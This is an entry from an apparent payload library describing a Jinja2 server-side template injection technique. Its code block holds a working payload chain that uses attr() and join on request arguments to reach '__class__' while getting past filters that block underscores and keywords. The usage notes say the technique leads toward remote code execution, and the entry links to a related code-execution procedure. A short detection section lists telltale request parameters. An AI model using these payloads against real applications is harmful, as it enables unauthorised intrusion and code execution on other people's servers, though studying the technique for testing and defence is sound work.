---
id: d0850778-a3a7-4468-bcd3-8db08a0187b7
type: code
language: python
verified: true
created_at: '2023-04-06T03:56:39.901448+00:00'
updated_at: '2023-04-10T20:23:43.898447+00:00'
platforms:
  - Web
tags:
  - jinja2
  - ssti
  - filter-bypass
validated: true
---

# bypass-jinja2-filter-to-access-class

## Code

```python
http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_ 

{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
```

## Description

Series of Jinja2 payloads using attr() and join to dynamically build and access '__class__' via request parameters, bypassing filters that block direct access.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $TARGET_URL | Vulnerable endpoint | http://localhost:5000/ |
| usc | Parameter for underscore ('_') | _ |
| class | Parameter for 'class' string | class |

## Usage

Send as GET request or embed expression in POST body. Builds '__class__' from parts to evade string filters; progresses to RCE chaining.

## Detection

- Anomalous request params like usc=_, class=class.
- Template evaluation logs with attr/join on request.args.

## Related

- [[procedures/Bypass-Jinja2-Filters-for-SSTI-Code-Execution]]
